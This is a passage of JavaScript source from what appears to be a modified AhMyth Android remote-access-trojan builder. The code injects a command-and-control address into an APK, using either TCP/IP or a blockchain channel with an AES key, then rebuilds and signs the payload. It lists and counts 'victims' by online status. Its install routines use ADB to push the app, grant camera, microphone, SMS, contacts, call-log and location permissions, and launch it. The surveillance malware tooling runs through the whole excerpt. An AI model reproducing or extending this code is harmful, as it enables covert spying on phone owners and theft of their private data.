                        delayedLog('[✓] Factory source updated successfully', CONSTANTS.logStatus.SUCCESS);
                    } else {
                        // Actual error occurred
                        const errorMsg = updateErr.message || String(updateErr);
                        console.error('[APK Builder] ✗ Failed to update Factory source:', errorMsg);
                        delayedLog(`[✗] Failed to update Factory source: ${errorMsg}`, CONSTANTS.logStatus.FAIL);
                        if (errorOutput) {
                            const errorLines = errorOutput.split('\n').filter(l => l.trim() && !l.includes('Profile loaded')).slice(-15);
                            if (errorLines.length > 0) {
                                console.error('[APK Builder] Error details (last 15 lines):');
                                errorLines.forEach(line => {
                                    if (line.length > 0) {
                                        console.error(`  ${line}`);
                                    }
                                });
                                delayedLog(`[ℹ] Error details (last 15 lines):`, CONSTANTS.logStatus.WARNING);
                                errorLines.forEach(line => {
                                    if (line.length > 0) {
                                        delayedLog(`    ${line.substring(0, 250)}`, CONSTANTS.logStatus.WARNING);
                                    }
                                });
                            }
                        }
                        devLog('[APK Builder] Using existing Factory source...');
                        delayedLog('[ℹ] Continuing with existing Factory source...', CONSTANTS.logStatus.INFO);
                    }
                    // Continue with existing source - don't fail the build
                }
            } else {
                console.warn('[APK Builder] ⚠ update-source.ps1 not found, using existing Factory source');
                delayedLog('[⚠] update-source.ps1 not found, using existing Factory source', CONSTANTS.logStatus.WARNING);
            }

            // Re-resolve IOSocket.smali in case update-source recreated the folder
            try {
                const refreshed = await findIOSocketSmali();
                ioPath = refreshed.file;
                factoryPath = refreshed.factoryPath;
            } catch (err) {
                console.error('[APK Builder] Failed to re-locate IOSocket.smali after update:', err.message);
                throw err;
            }

            // Ensure versionCode/versionName are bumped to avoid INSTALL_FAILED_VERSION_DOWNGRADE
            const manifestPath = path.join(factoryPath, 'Ahmyth', 'AndroidManifest.xml');
            if (fs.existsSync(manifestPath)) {
                try {
                    let manifest = fs.readFileSync(manifestPath, 'utf8');
                    // Set a high versionCode and clear versionName to a date-based name
                    const newVersionCode = Math.floor(Date.now() / 1000); // seconds since epoch
                    const newVersionName = `2.9.${newVersionCode}`;
                    manifest = manifest
                        .replace(/android:versionCode="[^"]*"/, `android:versionCode="${newVersionCode}"`)
                        .replace(/android:versionName="[^"]*"/, `android:versionName="${newVersionName}"`);
                    fs.writeFileSync(manifestPath, manifest, 'utf8');
                    console.log(`[APK Builder] Bumped versionCode to ${newVersionCode}`);
                    delayedLog(`[→] Bumped versionCode to ${newVersionCode}`, CONSTANTS.logStatus.INFO);
                } catch (e) {
                    console.warn(`[APK Builder] Could not bump versionCode: ${e.message}`);
                    delayedLog(`[⚠] Could not bump versionCode: ${e.message}`, CONSTANTS.logStatus.WARNING);
                }
            }

            // Update progress - Factory source done, now building
            $appCtrl.buildSteps[1].complete = true;
            $appCtrl.buildSteps[1].active = false;
            $appCtrl.buildSteps[2].active = true;
            $appCtrl.buildPercent = 40;
            $appCtrl.buildStatus = 'Decompiling APK...';
            if (!$appCtrl.$$phase) $appCtrl.$apply();
            
            // Update progress - Decompilation done, now injecting config
            $appCtrl.buildSteps[2].complete = true;
            $appCtrl.buildSteps[2].active = false;
            $appCtrl.buildSteps[3].active = true;
            $appCtrl.buildPercent = 60;
            $appCtrl.buildStatus = 'Injecting configuration...';
            if (!$appCtrl.$$phase) $appCtrl.$apply();
            
            // Use the validated values from earlier (for TCP/IP) or validate blockchain config
            if (connectionMode === 'blockchain') {
                devLog('[APK Builder] Injecting blockchain C2 config...');
                delayedLog('[→] Injecting blockchain C2 config...', CONSTANTS.logStatus.INFO);
                if (!rpcUrl || !contract || !aesKey || !clientKey) {
                    throw new Error('Missing blockchain settings (RPC URL, contract/channel, AES key, client key)');
                }
                await updateIOSocketBlockchain(ioPath, {
                    rpcUrl,
                    contract,
                    aesKey,
                    clientKey,
                    chain
                });
            } else {
                // TCP/IP mode - use the EXACT validated values from GUI (no defaults, no fallbacks)
                if (!validatedIp || !validatedPort) {
                    throw new Error('TCP/IP configuration validation failed. IP and port must be provided from GUI.');
                }
                
                // CRITICAL: These validatedIp and validatedPort values came from the GUI inputs
                // They were passed via BuildWithCurrentValues() -> Build() -> validated here
                devLog(`[APK Builder] Injecting TCP/IP: ${validatedIp}:${validatedPort}`);
                delayedLog(`[→] Injecting TCP/IP config: ${validatedIp}:${validatedPort}`, CONSTANTS.logStatus.INFO);
                await updateIOSocketTcp(ioPath, validatedIp, validatedPort);
            }

            // Update progress - Config injected, now building
            $appCtrl.buildSteps[3].complete = true;
            $appCtrl.buildSteps[3].active = false;
            $appCtrl.buildSteps[4].active = true;
            $appCtrl.buildPercent = 75;
            $appCtrl.buildStatus = 'Building final APK...';
            if (!$appCtrl.$$phase) $appCtrl.$apply();

            const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T');
            const ts = `${timestamp[0]}-${timestamp[1]}`;
            const outApk = `Ahmyth-${ts}.apk`;
            const signedApk = `Ahmyth-${ts}-aligned-debugSigned.apk`;

            // Build
            console.log('[APK Builder] Building APK with apktool...');
            delayedLog('[→] Building APK...', CONSTANTS.logStatus.INFO);
            const buildResult = await exec(`java -jar apktool.jar b Ahmyth -o "${outApk}"`, { cwd: path.join(factoryPath) });
            if (buildResult.stdout) {
                devLog('[APK Builder] Build output:', buildResult.stdout);
            }

            // Update progress - Building done, now signing
            $appCtrl.buildSteps[4].complete = true;
            $appCtrl.buildSteps[4].active = false;
            $appCtrl.buildSteps[5].active = true;
            $appCtrl.buildPercent = 90;
            $appCtrl.buildStatus = 'Signing APK...';
            if (!$appCtrl.$$phase) $appCtrl.$apply();

            // Sign
            devLog('[APK Builder] Signing APK...');
            delayedLog('[→] Signing APK...', CONSTANTS.logStatus.INFO);
            const signResult = await exec(`java -jar sign.jar -a "${outApk}"`, { cwd: path.join(factoryPath) });
            if (signResult.stdout) {
                console.log('[APK Builder] Sign output:', signResult.stdout);
            }

            // Copy APK to output folder so it shows in the payloads list
            const builtApkPath = path.join(factoryPath, signedApk);
            const finalApkPath = path.join(outputPath, signedApk);
            
            try {
                // Ensure output directory exists
                if (!fs.existsSync(outputPath)) {
                    fs.mkdirpSync(outputPath);
                }
                fs.copyFileSync(builtApkPath, finalApkPath);
                devLog(`[APK Builder] ✓ APK copied to output folder`);
                delayedLog(`[✓] APK copied to output folder`, CONSTANTS.logStatus.SUCCESS);
            } catch (copyErr) {
                console.warn(`[APK Builder] ⚠ Could not copy APK to output folder: ${copyErr.message}`);
                delayedLog(`[⚠] Could not copy APK to output folder: ${copyErr.message}`, CONSTANTS.logStatus.WARNING);
            }
            
            // Update progress - Complete!
            $appCtrl.buildSteps[5].complete = true;
            $appCtrl.buildSteps[5].active = false;
            $appCtrl.buildPercent = 100;
            $appCtrl.buildStatus = 'Build complete!';
            $appCtrl.buildComplete = true;
            $appCtrl.buildInProgress = false;
            if (!$appCtrl.$$phase) $appCtrl.$apply();
            
            // Store last built path (use output folder path)
            $appCtrl.lastBuiltApkPath = finalApkPath;
            devLog(`[APK Builder] ✓ APK built: ${signedApk}`);
            devLog(`[APK Builder] Location: ${finalApkPath}`);
            delayedLog(`[✓] APK built: ${signedApk}`, CONSTANTS.logStatus.SUCCESS);
            delayedLog(`[ℹ] Location: ${finalApkPath}`, CONSTANTS.logStatus.INFO);
            
            // Refresh payloads list
            $appCtrl.refreshPayloads();

            if (!$appCtrl.$$phase) $appCtrl.$applyAsync();
        } catch (e) {
            // Mark build as failed
            $appCtrl.buildError = true;
            $appCtrl.buildInProgress = false;
            $appCtrl.buildStatus = `Build failed: ${e.message}`;
            // Mark current active step as error
            const activeStep = $appCtrl.buildSteps.find(s => s.active);
            if (activeStep) {
                activeStep.error = true;
                activeStep.active = false;
            }
            if (!$appCtrl.$$phase) $appCtrl.$apply();
            
            $appCtrl.Log(`[✗] Build failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
            writeErrorLog(e, 'build.log');
        }
    };
    
    // Initialize preview
    setTimeout(() => {
        $appCtrl.regeneratePreview();
    }, 500);

    $appCtrl.logs = [];
    $appCtrl.isListen = false;
    
    // Build progress tracking
    $appCtrl.buildInProgress = false;
    $appCtrl.buildComplete = false;
    $appCtrl.buildError = false;
    $appCtrl.buildPercent = 0;
    $appCtrl.buildStatus = '';
    $appCtrl.buildSteps = [];

    // Helper function to generate a device fingerprint for deduplication
    const getDeviceFingerprint = (victim) => {
        if (!victim) return null;
        // Create a unique identifier based on device characteristics
        const parts = [
            victim.manf || victim.manufacturer || '',
            victim.model || '',
            victim.release || victim.version || '',
            victim.device || '',
            victim.brand || '',
            victim.product || ''
        ];
        return parts.filter(p => p).join('|').toLowerCase();
    };
    
    // Deduplication filter: when same device has both TCP/IP and blockchain entries, only show online one
    $appCtrl.getFilteredVictims = () => {
        if (!viclist || typeof viclist !== 'object') return {};
        
        const deviceMap = {}; // Map device fingerprint to best victim entry
        const filtered = {};
        
        // First pass: group victims by device fingerprint
        for (const [id, victim] of Object.entries(viclist)) {
            if (!victim || victim === -1) continue;
            
            const fingerprint = getDeviceFingerprint(victim);
            if (!fingerprint) {
                // If we can't create a fingerprint, include it anyway
                filtered[id] = victim;
                continue;
            }
            
            if (!deviceMap[fingerprint]) {
                deviceMap[fingerprint] = [];
            }
            deviceMap[fingerprint].push({ id, victim });
        }
        
        // Second pass: for each device, select the best entry
        for (const [fingerprint, entries] of Object.entries(deviceMap)) {
            if (entries.length === 1) {
                // Only one entry, include it
                filtered[entries[0].id] = entries[0].victim;
            } else {
                // Multiple entries for same device - prefer online one
                // Sort: online first, then by lastSeen (most recent), then prefer blockchain
                entries.sort((a, b) => {
                    const aOnline = a.victim.isOnline !== false;
                    const bOnline = b.victim.isOnline !== false;
                    
                    // Prefer online over offline
                    if (aOnline !== bOnline) {
                        return bOnline ? 1 : -1;
                    }
                    
                    // If both online or both offline, prefer most recent
                    const aLastSeen = a.victim.lastSeen || 0;
                    const bLastSeen = b.victim.lastSeen || 0;
                    if (aLastSeen !== bLastSeen) {
                        return bLastSeen - aLastSeen;
                    }
                    
                    // If same timestamp, prefer blockchain connection
                    const aIsBlockchain = (
                        a.victim.connectionType === 'blockchain' ||
                        a.victim.conn === 'blockchain' ||
                        a.victim.isBlockchain === true ||
                        a.victim.ip === 'Blockchain' ||
                        a.victim.country === 'BC'
                    );
                    const bIsBlockchain = (
                        b.victim.connectionType === 'blockchain' ||
                        b.victim.conn === 'blockchain' ||
                        b.victim.isBlockchain === true ||
                        b.victim.ip === 'Blockchain' ||
                        b.victim.country === 'BC'
                    );
                    
                    if (aIsBlockchain !== bIsBlockchain) {
                        return bIsBlockchain ? 1 : -1;
                    }
                    
                    // If all else equal, use first one
                    return 0;
                });
                
                // Use the best entry (first after sorting)
                filtered[entries[0].id] = entries[0].victim;
            }
        }
        
        return filtered;
    };
    
    // Get victim count
    $appCtrl.getVictimCount = () => {
        const filtered = $appCtrl.getFilteredVictims();
        return Object.keys(filtered).length;
    };

    // Get online victim count
    $appCtrl.getOnlineCount = () => {
        const filtered = $appCtrl.getFilteredVictims();
        return Object.keys(filtered).filter(key => filtered[key] && filtered[key].isOnline !== false).length;
    };

    // Get offline victim count
    $appCtrl.getOfflineCount = () => {
        const filtered = $appCtrl.getFilteredVictims();
        return Object.keys(filtered).filter(key => filtered[key] && filtered[key].isOnline === false).length;
    };

    // Format last seen time
    $appCtrl.formatLastSeen = (timestamp) => {
        if (!timestamp) return 'Unknown';
        const diff = Date.now() - timestamp;
        if (diff < 60000) return 'Just now';
        if (diff < 3600000) return Math.floor(diff / 60000) + ' min ago';
        if (diff < 86400000) return Math.floor(diff / 3600000) + ' hours ago';
        return Math.floor(diff / 86400000) + ' days ago';
    };

    // Payload management
    $appCtrl.refreshPayloads = () => {
        try {
            const payloads = [];
            const seenNames = new Set();
            
            // Check output folder (~/AhMyth/Output)
            if (fs.existsSync(outputPath)) {
                const files = fs.readdirSync(outputPath).filter(f => f.endsWith('.apk'));
                files.forEach(f => {
                    if (!seenNames.has(f)) {
                        seenNames.add(f);
                        const stats = fs.statSync(path.join(outputPath, f));
                        payloads.push({
                            name: f,
                            path: path.join(outputPath, f),
                            size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
                            date: stats.mtime
                        });
                    }
                });
            }
            
            // Also check Factory folder for APKs built there
            const factoryPath = path.resolve(__dirname, '..', 'Factory');
            if (fs.existsSync(factoryPath)) {
                const files = fs.readdirSync(factoryPath).filter(f => f.endsWith('.apk') && f.includes('Signed'));
                files.forEach(f => {
                    if (!seenNames.has(f)) {
                        seenNames.add(f);
                        const stats = fs.statSync(path.join(factoryPath, f));
                        payloads.push({
                            name: f,
                            path: path.join(factoryPath, f),
                            size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
                            date: stats.mtime
                        });
                    }
                });
            }
            
            $appCtrl.builtPayloads = payloads.sort((a, b) => b.date - a.date);
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        } catch (e) {
            console.error('Error refreshing payloads:', e);
        }
    };

    // Copy payload path to clipboard
    $appCtrl.copyPayloadPath = (payload) => {
        if (payload && payload.path) {
            require('electron').clipboard.writeText(payload.path);
            $appCtrl.Log('[✓] Path copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };

    // Helper function to execute ADB command with timeout
    const execAdbWithTimeout = (command, timeoutMs = 5000) => {
        return new Promise((resolve, reject) => {
            const child = execCallback(command, (err, stdout, stderr) => {
                clearTimeout(timeout);
                if (err) {
                    // Include stderr in error message if available
                    const errorMsg = stderr ? `${err.message}\n${stderr}` : err.message;
                    reject(new Error(errorMsg));
                } else {
                    // Return stdout, but also include stderr if it contains useful info
                    const output = stdout || '';
                    const stderrOutput = stderr || '';
                    // Some ADB commands output to stderr even on success
                    if (stderrOutput && !stderrOutput.toLowerCase().includes('error')) {
                        resolve(output + (output ? '\n' : '') + stderrOutput);
                    } else {
                        resolve(output);
                    }
                }
            });
            
            // Set timeout
            const timeout = setTimeout(() => {
                child.kill();
                reject(new Error(`Command timed out after ${timeoutMs}ms: ${command}`));
            }, timeoutMs);
            
            child.on('exit', (code) => {
                clearTimeout(timeout);
            });
        });
    };

    // Get connected ADB device (prioritizes emulators over real devices)
    $appCtrl.getConnectedDevice = async () => {
        const adbPorts = [5037, 5038, 5039, 5040, 5041];
        const allDevices = []; // Collect all devices from all ports
        
        // Helper to check if device ID looks like an emulator
        const isEmulator = (deviceId, deviceInfo = '') => {
            // Check device ID patterns
            if (deviceId.startsWith('emulator-')) return true;
            if (deviceId.match(/^127\.0\.0\.1:\d+$/)) return true;
            if (deviceId.match(/^localhost:\d+$/)) return true;
            if (deviceId.match(/^10\.0\.2\.\d+:\d+$/)) return true;
            
            // Check device info for emulator indicators
            const infoLower = deviceInfo.toLowerCase();
            if (infoLower.includes('emulator') || 
                infoLower.includes('genymotion') ||
                infoLower.includes('sdk') ||
                infoLower.includes('google_sdk') ||
                infoLower.includes('android_sdk')) {
                return true;
            }
            
            return false;
        };
        
        // Check all ADB ports
        for (const port of adbPorts) {
            try {
                const stdout = await execAdbWithTimeout(`adb -P ${port} devices`, 3000);
                if (stdout) {
                    const lines = stdout.split('\n').filter(l => l.trim() && !l.includes('List of devices'));
                    for (const line of lines) {
                        const match = line.match(/^(\S+)\s+(device|emulator)/);
                        if (match) {
                            const deviceId = match[1];
                            let deviceInfo = '';
                            
                            // Try to get device info to better detect emulators
                            try {
                                deviceInfo = await execAdbWithTimeout(`adb -P ${port} -s ${deviceId} shell getprop ro.product.model`, 2000);
                            } catch (e) {
                                // Ignore errors getting device info
                            }
                            
                            // Check if device already added
                            if (!allDevices.find(d => d.deviceId === deviceId && d.adbPort === port)) {
                                allDevices.push({ 
                                    deviceId: deviceId, 
                                    adbPort: port,
                                    deviceInfo: (deviceInfo || '').trim()
                                });
                            }
                        }
                    }
                }
            } catch (e) {
                // Port not available or error, continue to next port
                continue;
            }
        }
        
        // Check if any devices found
        if (allDevices.length === 0) {
            throw new Error('No ADB device found. Make sure a device/emulator is connected and ADB is running.');
        }
        
        // Sort devices: emulators first, then real devices
        allDevices.sort((a, b) => {
            const aIsEmulator = isEmulator(a.deviceId, a.deviceInfo || '');
            const bIsEmulator = isEmulator(b.deviceId, b.deviceInfo || '');
            if (aIsEmulator && !bIsEmulator) return -1; // Emulator comes first
            if (!aIsEmulator && bIsEmulator) return 1;
            return 0;
        });
        
        const selected = allDevices[0];
        const deviceType = isEmulator(selected.deviceId, selected.deviceInfo || '') ? 'emulator' : 'physical device';
        devLog(`[ADB] Selected ${deviceType}: ${selected.deviceId} (from ${allDevices.length} available device(s))`);
        $appCtrl.Log(`[ℹ] Found ${allDevices.length} device(s), selected ${deviceType}: ${selected.deviceId}`, CONSTANTS.logStatus.INFO);
        if (allDevices.length > 1 && IS_DEVELOPMENT) {
            const otherDevices = allDevices.slice(1).map(d => `${d.deviceId} (${isEmulator(d.deviceId, d.deviceInfo || '') ? 'emulator' : 'device'})`).join(', ');
            devLog(`[ADB] Other available devices: ${otherDevices}`);
        }
        
        return selected;
    };

    // Install APK on connected device (and run it)
    $appCtrl.installApk = async (apkPath) => {
        if (!apkPath) {
            $appCtrl.Log('[✗] No APK path provided', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        if (!fs.existsSync(apkPath)) {
            $appCtrl.Log(`[✗] APK not found: ${apkPath}`, CONSTANTS.logStatus.FAIL);
            return;
        }
        
        $appCtrl.Log(`[→] Installing APK: ${path.basename(apkPath)}...`, CONSTANTS.logStatus.INFO);
        devLog('[Install] Starting installation process...');
        
        try {
            $appCtrl.Log('[→] Detecting connected devices...', CONSTANTS.logStatus.INFO);
            devLog('[Install] Getting connected device...');
            const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
            devLog(`[Install] Device selected: ${deviceId} on port ${adbPort}`);
            const isEmulator = deviceId.startsWith('emulator-') || 
                               deviceId.match(/^127\.0\.0\.1:\d+$/) ||
                               deviceId.match(/^localhost:\d+$/) ||
                               deviceId.match(/^10\.0\.2\.\d+:\d+$/);
            const deviceType = isEmulator ? '📱 Emulator' : '📲 Physical device';
            $appCtrl.Log(`[ℹ] Found ${deviceType}: ${deviceId} (ADB port ${adbPort})`, CONSTANTS.logStatus.INFO);
            
            // Uninstall old version first (ignore errors)
            $appCtrl.Log('[→] Uninstalling previous version...', CONSTANTS.logStatus.INFO);
            try {
                await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, 10000);
            } catch (e) {
                // Ignore uninstall errors
            }
            
            // Verify device is still connected before installing
            $appCtrl.Log('[→] Verifying device connection...', CONSTANTS.logStatus.INFO);
            try {
                const state = await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} get-state`, 5000);
                if (!state || !state.trim().includes('device')) {
                    throw new Error(`Device ${deviceId} is not connected or not ready (state: ${state.trim()})`);
                }
            } catch (e) {
                throw new Error(`Device ${deviceId} verification failed: ${e.message}`);
            }
            
            // Install with downgrade flag and better error handling
            $appCtrl.Log('[→] Installing APK (this may take up to 2 minutes)...', CONSTANTS.logStatus.INFO);
            const installCmd = `adb -P ${adbPort} -s ${deviceId} install --no-incremental -r -d "${apkPath}"`;
            
            try {
                const output = await execAdbWithTimeout(installCmd, 120000);
                const outputLower = output.toLowerCase();
                
                // Check for success indicators
                if (outputLower.includes('success') || outputLower.includes('performing streamed install')) {
                    $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
                } else if (outputLower.includes('failure') || outputLower.includes('error')) {
                    // Check for common non-fatal errors
                    if (outputLower.includes('install_failed_already_exists') || 
                        outputLower.includes('install_failed_version_downgrade')) {
                        $appCtrl.Log('[ℹ] Package already installed or version conflict, continuing...', CONSTANTS.logStatus.INFO);
                    } else {
                        throw new Error(`Install failed: ${output}`);
                    }
                } else {
                    // Assume success if no clear error
                }
            } catch (e) {
                if (e.message.includes('timed out')) {
                    throw new Error('Installation timed out after 120 seconds. The device may be unresponsive or the APK may be too large.');
                }
                const errorMsg = e.message || e.toString();
                // Check for common non-fatal errors
                if (errorMsg.toLowerCase().includes('install_failed_already_exists') || 
                    errorMsg.toLowerCase().includes('install_failed_version_downgrade')) {
                    $appCtrl.Log('[ℹ] Package already installed or version conflict, continuing...', CONSTANTS.logStatus.INFO);
                } else {
                    throw new Error(`Install failed: ${errorMsg}`);
                }
            }
            
            
            // Grant permissions
            $appCtrl.Log('[→] Granting permissions...', CONSTANTS.logStatus.INFO);
            const permissions = [
                'android.permission.CAMERA',
                'android.permission.RECORD_AUDIO',
                'android.permission.READ_CONTACTS',
                'android.permission.READ_SMS',
                'android.permission.READ_CALL_LOG',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.READ_EXTERNAL_STORAGE',
                'android.permission.WRITE_EXTERNAL_STORAGE'
            ];
            
            for (const perm of permissions) {
                try {
                    await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell pm grant ahmyth.mine.king.ahmyth ${perm}`, 5000);
                } catch (e) {
                    // Ignore permission grant errors (some permissions may not be grantable)
                }
            }
            $appCtrl.Log('[✓] Permissions granted', CONSTANTS.logStatus.SUCCESS);
            
            // Launch the app
            $appCtrl.Log('[→] Launching app...', CONSTANTS.logStatus.INFO);
            try {
                await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell am start -n ahmyth.mine.king.ahmyth/.MainActivity`, 10000);
            } catch (e) {
                // Try alternative launch method
                try {
                    await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell monkey -p ahmyth.mine.king.ahmyth -c android.intent.category.LAUNCHER 1`, 10000);
                } catch (e2) {
                    $appCtrl.Log('[⚠] Failed to launch app automatically, but installation succeeded', CONSTANTS.logStatus.WARNING);
                }
            }
            
            $appCtrl.Log('[✓] App launched successfully!', CONSTANTS.logStatus.SUCCESS);
            $appCtrl.Log('[ℹ] Waiting for device to connect...', CONSTANTS.logStatus.INFO);
            
        } catch (e) {
            $appCtrl.Log(`[✗] ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
        
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Install and run the last built APK
    $appCtrl.installAndRun = async () => {
        if (!$appCtrl.lastBuiltApkPath) {
            $appCtrl.Log('[✗] No APK has been built yet', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        if (!fs.existsSync($appCtrl.lastBuiltApkPath)) {
            $appCtrl.Log(`[✗] APK not found: ${$appCtrl.lastBuiltApkPath}`, CONSTANTS.logStatus.FAIL);
            return;
        }
        
        $appCtrl.Log(`[→] Installing and running: ${path.basename($appCtrl.lastBuiltApkPath)}...`, CONSTANTS.logStatus.INFO);
        
        try {
            const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
            const isEmulator = deviceId.startsWith('emulator-') || 
                               deviceId.match(/^127\.0\.0\.1:\d+$/) ||
                               deviceId.match(/^localhost:\d+$/) ||
                               deviceId.match(/^10\.0\.2\.\d+:\d+$/);
            const deviceType = isEmulator ? '📱 Emulator' : '📲 Physical device';
            $appCtrl.Log(`[ℹ] Found ${deviceType}: ${deviceId} (ADB port ${adbPort})`, CONSTANTS.logStatus.INFO);
            
            // Uninstall old version first (ignore errors)
            $appCtrl.Log('[→] Uninstalling previous version...', CONSTANTS.logStatus.INFO);
            try {
                await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, 10000);
            } catch (e) {
                // Ignore uninstall errors
            }
            
            // Verify device is still connected before installing
            $appCtrl.Log('[→] Verifying device connection...', CONSTANTS.logStatus.INFO);
            try {
                const state = await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} get-state`, 5000);
                if (!state || !state.trim().includes('device')) {
                    throw new Error(`Device ${deviceId} is not connected or not ready (state: ${state.trim()})`);
                }
            } catch (e) {
                throw new Error(`Device ${deviceId} verification failed: ${e.message}`);
            }
            
            // Install with downgrade flag and better error handling
            $appCtrl.Log('[→] Installing APK (this may take up to 2 minutes)...', CONSTANTS.logStatus.INFO);
            const installCmd = `adb -P ${adbPort} -s ${deviceId} install --no-incremental -r -d "${$appCtrl.lastBuiltApkPath}"`;
            
            try {
                const output = await execAdbWithTimeout(installCmd, 120000);
                const outputLower = output.toLowerCase();
                
                // Check for success indicators
                if (outputLower.includes('success') || outputLower.includes('performing streamed install')) {
                    $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
                } else if (outputLower.includes('failure') || outputLower.includes('error')) {
                    // Check for common non-fatal errors
                    if (outputLower.includes('install_failed_already_exists') || 
                        outputLower.includes('install_failed_version_downgrade')) {
                        $appCtrl.Log('[ℹ] Package already installed or version conflict, continuing...', CONSTANTS.logStatus.INFO);
                    } else {
                        throw new Error(`Install failed: ${output}`);
                    }
                } else {
                    // Assume success if no clear error
                    $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
                }
            } catch (e) {
                if (e.message.includes('timed out')) {
                    throw new Error('Installation timed out after 120 seconds. The device may be unresponsive or the APK may be too large.');
                }
                const errorMsg = e.message || e.toString();
                // Check for common non-fatal errors
                if (errorMsg.toLowerCase().includes('install_failed_already_exists') || 
                    errorMsg.toLowerCase().includes('install_failed_version_downgrade')) {
                    $appCtrl.Log('[ℹ] Package already installed or version conflict, continuing...', CONSTANTS.logStatus.INFO);
                } else {
                    throw new Error(`Install failed: ${errorMsg}`);
                }
            }
            
            
            // Grant permissions
            $appCtrl.Log('[→] Granting permissions...', CONSTANTS.logStatus.INFO);
            const permissions = [
                'android.permission.CAMERA',
                'android.permission.RECORD_AUDIO',
                'android.permission.READ_CONTACTS',
                'android.permission.READ_SMS',
                'android.permission.READ_CALL_LOG',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.READ_EXTERNAL_STORAGE',
                'android.permission.WRITE_EXTERNAL_STORAGE'
            ];
            
            for (const perm of permissions) {
                try {
                    await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell pm grant ahmyth.mine.king.ahmyth ${perm}`, 5000);
                } catch (e) {
                    // Ignore permission grant errors (some permissions may not be grantable)
                }
            }
            $appCtrl.Log('[✓] Permissions granted', CONSTANTS.logStatus.SUCCESS);
            
            // Launch the app
            $appCtrl.Log('[→] Launching app...', CONSTANTS.logStatus.INFO);
            try {
                await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell am start -n ahmyth.mine.king.ahmyth/.MainActivity`, 10000);
            } catch (e) {
                // Try alternative launch method
                try {
                    await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell monkey -p ahmyth.mine.king.ahmyth -c android.intent.category.LAUNCHER 1`, 10000);
                } catch (e2) {
                    $appCtrl.Log('[⚠] Failed to launch app automatically, but installation succeeded', CONSTANTS.logStatus.WARNING);
                }
            }
            
            $appCtrl.Log('[✓] App launched successfully!', CONSTANTS.logStatus.SUCCESS);
            $appCtrl.Log('[ℹ] Waiting for device to connect...', CONSTANTS.logStatus.INFO);
            
        } catch (e) {
            $appCtrl.Log(`[✗] ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
        
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Uninstall app from device
    $appCtrl.uninstallApp = async () => {
        $appCtrl.Log('[→] Uninstalling AndroThreat from device...', CONSTANTS.logStatus.INFO);
        
        try {
            const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
            $appCtrl.Log(`[ℹ] Found device: ${deviceId}`, CONSTANTS.logStatus.INFO);
            
            try {
                const output = await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, 15000);
                if (output && output.includes('Failure')) {
                    $appCtrl.Log('[ℹ] App was not installed or already uninstalled', CONSTANTS.logStatus.INFO);
                } else {
                    $appCtrl.Log('[✓] App uninstalled successfully', CONSTANTS.logStatus.SUCCESS);
                }
            } catch (e) {
                $appCtrl.Log('[ℹ] App was not installed or already uninstalled', CONSTANTS.logStatus.INFO);
            }
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        } catch (e) {
            $appCtrl.Log(`[✗] ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };

    // Delete a built APK
    $appCtrl.deletePayload = (payload) => {
        if (!payload || !payload.path) return;
        
        try {
            fs.unlinkSync(payload.path);
            $appCtrl.Log(`[✓] Deleted: ${payload.name}`, CONSTANTS.logStatus.SUCCESS);
            $appCtrl.refreshPayloads();
        } catch (e) {
            $appCtrl.Log(`[✗] Failed to delete: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };

    // Open folders
    $appCtrl.openOutputFolder = () => {
        if (shell) {
            shell.openPath(outputPath);
        }
    };

    $appCtrl.openDownloadsFolder = () => {
        if (shell) {
            shell.openPath(downloadsPath);
        }
    };

    // Initialize payloads list
    $appCtrl.refreshPayloads();

    // ========== TEST SUITE CONTROLLER ==========
    $appCtrl.testConfig = {
        deviceId: '',
        serverIP: '192.168.0.180',
        port: 1234,
        connectionType: 'tcp',               // tcp | blockchain
        blockchainChain: 'solana',           // solana | evm
        blockchainRpcUrl: '',                // filled below from app settings
        blockchainContract: '',              // filled below from app settings
        blockchainAesKey: '',                // optional AES key for C2
        autoBuild: true,
        forceRebuild: true,
        onlyFailing: false
    };
    // Initialize test config blockchain fields from current app settings
    $appCtrl.testConfig.blockchainRpcUrl = $appCtrl.builder.blockchainRpcUrl || $appCtrl.blockchainC2RpcUrl || '';
    $appCtrl.testConfig.blockchainContract = $appCtrl.blockchainContract || $appCtrl.blockchainC2Contract || '';
    $appCtrl.testConfig.blockchainAesKey = $appCtrl.builder.blockchainC2AesKey || '';
    
    $appCtrl.availableDevices = [];
    $appCtrl.isRunning = false;
    $appCtrl.outputLines = [];
    $appCtrl.testStats = {
        total: 0,
        passed: 0,
        failed: 0
    };
    $appCtrl.testResults = [];
